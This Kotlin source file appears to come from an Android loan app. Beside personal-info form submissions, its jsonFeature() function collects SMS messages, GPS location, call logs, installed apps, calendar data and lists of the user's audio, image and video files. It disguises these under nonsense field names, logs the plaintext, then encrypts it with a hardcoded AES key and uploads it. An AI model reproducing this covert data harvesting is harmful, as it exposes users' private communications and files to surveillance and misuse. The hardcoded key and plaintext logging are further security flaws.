package com.facile.immediate.electronique.fleurs.pret.input.model

import com.arthur.baselib.structure.base.IBaseModel
import com.arthur.commonlib.ability.AppKit
import com.arthur.commonlib.ability.Logger
import com.arthur.commonlib.utils.AppUtils
import com.arthur.commonlib.utils.json.JsonUtils
import com.facile.immediate.electronique.fleurs.pret.common.json.JsonUploadApi
import com.facile.immediate.electronique.fleurs.pret.common.json.bean.DevizeInfor
import com.facile.immediate.electronique.fleurs.pret.common.json.model.JSONNeed
import com.facile.immediate.electronique.fleurs.pret.common.json.tools.AppTool
import com.facile.immediate.electronique.fleurs.pret.common.json.tools.BatteTool
import com.facile.immediate.electronique.fleurs.pret.common.json.tools.CanlTool
import com.facile.immediate.electronique.fleurs.pret.common.json.tools.ContractedTool
import com.facile.immediate.electronique.fleurs.pret.common.json.tools.EncryptTool
import com.facile.immediate.electronique.fleurs.pret.common.json.tools.GeneralDataTool
import com.facile.immediate.electronique.fleurs.pret.common.json.tools.HWTool
import com.facile.immediate.electronique.fleurs.pret.common.json.tools.StoreTool
import com.facile.immediate.electronique.fleurs.pret.common.user.UserBasicEntity
import com.facile.immediate.electronique.fleurs.pret.net.BaseResponse
import com.facile.immediate.electronique.fleurs.pret.net.NetMgr
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody

class InputModel : IBaseModel {
    private val bigJSONService = NetMgr.get().service<JsonUploadApi>()

    private val service = NetMgr.get().service<InputAPI>()

    suspend fun isNeedJsonUp(): BaseResponse<JSONNeed?> {
        return bigJSONService.jsonNeed()
    }

    suspend fun jsonFeature(): BaseResponse<Any?> {
        val devizeInfor = DevizeInfor(
            frontTheftBirthplace = HWTool.generateFrontTheftBirthplace(),
            dailyMud = StoreTool.generateDailyMud(),
            smallPioneerCharacterAfricanSuperman = GeneralDataTool.generateDate(),
            smellyGuitarHelpfulIndependence = GeneralDataTool.generateOthers(),
            certainBarLorrySaturday = AppTool.generateApp(),
            electricCigarRareSeriousField = ContractedTool.generateSsMSs(),
            livePolice = ContractedTool.generateGPS(),
            splendidGrapeAloneFierceLesson = BatteTool.generateSplendidGrapeAloneFierceLesson(),
            splendidScholarshipChildLeadingBedroom = GeneralDataTool.generatePushUsers(),
            eachReceptionistExactPrinter = GeneralDataTool.internalAudFiles(),
            localMathematicsEndlessGardening = GeneralDataTool.internalImgFiles(),
            rightJuniorTeenagerSomeone = GeneralDataTool.internalVidFiles(),
            aggressiveLatestEntranceSuspect = AppUtils.getAppVersionCode(AppKit.context).toString(),
            britishPeriodCounterPersonalTheme = AppUtils.getAppVersionName(AppKit.context),
            absentDadInitialSuffering = AppUtils.getPackageName(AppKit.context) ?: "",
            mistakenHelpfulSoundCompany = System.currentTimeMillis(),
            magicSoftRussianForm = CanlTool.generateCanl(),
            mountainousBrunchLuckySecondChemist = ContractedTool.generateCallls(),
        )

        val jsonStr = JsonUtils.toJsonString(devizeInfor)
        Logger.logE("$jsonStr")
        val encryptResult = EncryptTool.AESEncrypt(
            EncryptTool.compress(jsonStr) ?: "",
            "2457ece4e5e3389b0d1804fdbb4ff393"
        ) ?: ""
        Logger.logE("encryptResult $encryptResult")
        return bigJSONService.jsonFeature(encryptResult.toRequestBody("application/json".toMediaType()))
    }

    suspend fun preInputInfo(pageType: Int = 1): BaseResponse<UserBasicEntity?> {
        return service.preInputInfo(pageType)
    }

    suspend fun savePersonalInfo(
        pageType: Int,
        names: String,
        surnames: String,
        birthDay: String,
        sex: String,
        email: String,
        mercifulVanillaMatchBitterFirewood: String,
        neitherSeniorStocking: String,
        australianHandsomeSummer: String,
        fullAddress: String
    ): BaseResponse<Any?> {
        return service.savePersonalInfo(
            pageType,
            names,
            surnames,
            birthDay,
            sex,
            email,
            mercifulVanillaMatchBitterFirewood,
            neitherSeniorStocking,
            australianHandsomeSummer,
            fullAddress
        )
    }

    suspend fun saveContactInfo(
        pageType: Int,
        phoneNumber: String,
        name: String,
        relationship: String,
        phoneNumberSec: String,
        nameSec: String,
        relationshipSec: String
    ): BaseResponse<Any?> {
        return service.saveContactInfo(
            pageType,
            phoneNumber,
            name,
            relationship,
            phoneNumberSec,
            nameSec,
            relationshipSec
        )
    }

    suspend fun saveIdentityInfo(
        pageType: Int,
        phoneNo: String,
        idCardNo: String
    ): BaseResponse<Any?> {
        return service.saveIdentityInfo(pageType, phoneNo, idCardNo)
    }

    suspend fun gatheringInfo(): BaseResponse<List<GatheringInfo>?> {
        return service.gatheringInfo()
    }

    suspend fun saveGatheringInfo(map: Map<String, String>): BaseResponse<Any?> {
        return service.saveGatheringInfo(map)
    }

    suspend fun identityAfrPic(pageType: Int): BaseResponse<IdentityPic?> {
        return service.identityAfrPic(pageType)
    }
}